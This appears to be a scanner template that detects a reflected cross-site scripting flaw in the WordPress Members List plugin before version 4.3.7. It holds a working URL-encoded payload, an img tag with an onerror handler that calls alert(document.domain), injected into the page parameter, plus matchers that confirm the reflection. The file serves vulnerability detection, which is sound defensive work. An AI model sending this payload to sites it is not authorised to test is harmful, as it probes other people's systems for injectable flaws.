id: "members-list-xss"
name: "WordPress Members List <4.3.7 - Cross-Site Scripting"
severity: "medium"
description: "WordPress Members List 4.3.7 does not sanitize and escape some parameters in various pages before outputting them back, leading to reflected cross-site scripting vulnerabilities."
tech:
  - "wordpress"
  - "php"
tags:
  - "wp"
  - "wordpress"
  - "wp-plugin"
  - "xss"
  - "wpscan"
  - "vuln"
reference: "https://wpscan.com/vulnerability/d13f26f0-5d91-49d7-b514-1577d4247648"
spaExclusion: true
request:
  method: "GET"
  path: "/wp-content/plugins/members-list/admin/view/user.php?page=%22%3E%3Cimg%20src%20onerror=alert(document.domain)%20x"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "\"><img src onerror=alert(document.domain) x"
      - "wrap tern-wrap"
    condition: "and"
  - type: "word"
    part: "header"
    words:
      - "text/html"
  - type: "status"
    status:
      - 200
